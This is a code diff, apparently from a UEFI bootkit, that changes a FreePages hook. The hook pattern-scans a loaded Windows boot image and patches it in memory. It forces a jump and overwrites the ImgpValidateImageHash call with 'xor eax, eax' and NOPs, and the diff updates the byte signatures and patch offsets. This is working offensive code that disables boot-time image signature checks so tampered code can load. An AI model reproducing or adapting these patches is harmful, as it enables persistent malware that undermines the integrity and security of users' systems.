@@ -76,24 +76,22 @@ D_SEC( B ) EFI_STATUS EFIAPI FreePagesHook( IN EFI_PHYSICAL_ADDRESS Memory, IN U
                 while ( U_PTR( Adr ) < U_PTR( Dos ) + Nth->OptionalHeader.SizeOfImage )
                 {
                     /* jz short loc_180096FBF -> jmp short loc_180096FBF */
-                    if ( Adr[ 0x00 ] == 0x3B && 
-                         Adr[ 0x01 ] == 0xC7 &&
-                         Adr[ 0x02 ] == 0x74 && 
-                         Adr[ 0x03 ] == 0x5B )
+                    if ( Adr[ 0x00 ] == 0xC7 &&
+                         Adr[ 0x01 ] == 0x74 &&
+                         Adr[ 0x04 ] == 0x0F )
                     {
-                        *( PUINT8 )( U_PTR( Adr + 0x02 ) ) = ( UINT8 )( 0xEB ); /* jmp */
+                        *( PUINT8 )( U_PTR( Adr + 0x01 ) ) = ( UINT8 )( 0xEB ); /* jmp */
                     }
 
                     /* call ImgpValidateImageHash -> xor eax, eax */
-                    if ( Adr[ 0x00 ] == 0x24 && 
-                         Adr[ 0x01 ] == 0x20 &&
-                         Adr[ 0x03 ] == 0x8B && 
-                         Adr[ 0x04 ] == 0x48 )
+                    if ( Adr[ 0x00 ] == 0xD8 &&
+                         Adr[ 0x01 ] == 0x3D &&
+                         Adr[ 0x02 ] == 0x2D )
                     {
-                        *( PUINT16 )( U_PTR( Adr + 0x06 ) ) = ( UINT16 )( 0xC031 ); /* xor eax, eax */
-                        *( PUINT8 ) ( U_PTR( Adr + 0x08 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
-                        *( PUINT8 ) ( U_PTR( Adr + 0x09 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
-                        *( PUINT8 ) ( U_PTR( Adr + 0x0A ) ) = ( UINT8 ) ( 0x90 );   /* nop */
+                        *( PUINT16 )( U_PTR( Adr - 0x06 ) ) = ( UINT16 )( 0xC031 ); /* xor eax, eax */
+                        *( PUINT8 ) ( U_PTR( Adr - 0x04 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
+                        *( PUINT8 ) ( U_PTR( Adr - 0x03 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
+                        *( PUINT8 ) ( U_PTR( Adr - 0x02 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
 
                         /* Restore the original routine */
                         Gen->SystemTable->BootServices->FreePages = C_PTR( Gen->FreePages );
